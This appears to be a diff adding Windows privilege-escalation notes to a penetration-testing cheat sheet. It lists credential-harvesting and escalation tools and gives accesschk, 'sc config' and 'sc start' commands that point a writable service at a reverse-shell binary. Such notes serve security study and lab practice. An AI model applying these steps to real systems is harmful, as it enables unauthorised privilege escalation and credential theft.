@@ -3,6 +3,68 @@
 ## Windows
 > [LOLBAS](https://lolbas-project.github.io/)
 
+### Privilege Escalation
+- WinPEAS
+- LinPEAS
+- windows exploit suggester
+- sweet potato, juicy potato, lonely potato, hot potato
+- BloodHound
+
+### Credential Harvesting
+- Responder
+- Inveigh
+- Mimikatz
+- ntdsutil
+- secretsdump
+- Impacket
+
+### Service Exploits
+
+#### Insecure Service Permissions
+1. Find a writable service.
+    - accesschk.exe
+
+        ```powershell
+        # accesschk.exe
+        #   [
+        #       [-d]        (only process directories or top level key)
+        #       -k          (name is a Registry key)
+        #       -p [-f]     (name is a process name or PID)
+        #                   (show full process token information)
+        #       -c          (name is a Windows Service)
+        #       -o [-t <object type>]
+        #                   (name is an object in the Object Manager namespace)
+        #   ]
+        #   [-r]        (show read access only)
+        #   [-w]        (show write access only)
+        #   [<username>]
+        #   { <file (default)> | <directory> | <registry key> | <process> | <service> | <object> }
+
+        accesschk.exe /accepteula -uwcqv user *
+        ```
+1. Overwrite the service config.
+
+    - sc
+
+        ```powershell
+        sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
+        ```
+
+1. Start ther service.
+
+    - sc
+
+        ```powershell
+        sc start daclsvc
+        ```
+
+    - net
+
+        ```powershell
+        net start daclsvc
+        ```
+
+
 ### Potato Attacks
 
 ### Print Spoofer
